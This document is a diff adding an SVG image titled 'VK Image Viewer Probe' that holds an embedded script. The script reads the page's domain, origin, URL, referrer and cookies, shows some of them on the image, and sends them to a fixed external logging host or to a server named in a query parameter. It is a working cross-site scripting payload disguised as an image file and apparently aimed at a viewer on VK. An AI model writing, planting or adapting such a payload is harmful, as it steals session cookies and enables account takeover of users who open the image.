@@ -1,0 +1,36 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="600" height="400">
+  <rect width="600" height="400" fill="#1a1a2e"/>
+  <text x="50%" y="30%" fill="#e94560" font-size="28" text-anchor="middle" font-family="sans-serif">VK Image Viewer Probe</text>
+  <text x="50%" y="50%" fill="#0f3460" font-size="16" text-anchor="middle" font-family="monospace" id="d">loading…</text>
+  <text x="50%" y="65%" fill="#16213e" font-size="12" text-anchor="middle" font-family="monospace" id="c"></text>
+  <text x="50%" y="80%" fill="#53354a" font-size="12" text-anchor="middle" font-family="monospace" id="o"></text>
+  <script>
+    var info = {
+      domain: document.domain,
+      origin: location.origin,
+      href: location.href.slice(0, 200),
+      cookie: document.cookie.slice(0, 200),
+      referrer: document.referrer,
+      ancestors: (function(){ try { return JSON.stringify([...location.ancestorOrigins]); } catch(e) { return 'N/A'; } })()
+    };
+    document.getElementById('d').textContent = 'domain: ' + info.domain;
+    document.getElementById('c').textContent = 'cookie: ' + (info.cookie || '(none)');
+    document.getElementById('o').textContent = 'origin: ' + info.origin;
+
+    // Exfiltrate to capture server via query param or beacon
+    var srv = new URLSearchParams(location.search).get('srv') || '';
+    if (!srv) {
+      // Try to extract srv from referrer or just beacon to etho0
+      var img = new Image();
+      img.src = 'https://etho0.github.io/log?type=SVG_XSS_EXEC_REMOTE&domain=' +
+        encodeURIComponent(info.domain) + '&origin=' + encodeURIComponent(info.origin) +
+        '&cookie=' + encodeURIComponent(info.cookie) + '&href=' + encodeURIComponent(info.href);
+    } else {
+      fetch(srv + '/log?type=SVG_XSS_EXEC_REMOTE', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(info)
+      }).catch(function(){});
+    }
+  </script>
+</svg>
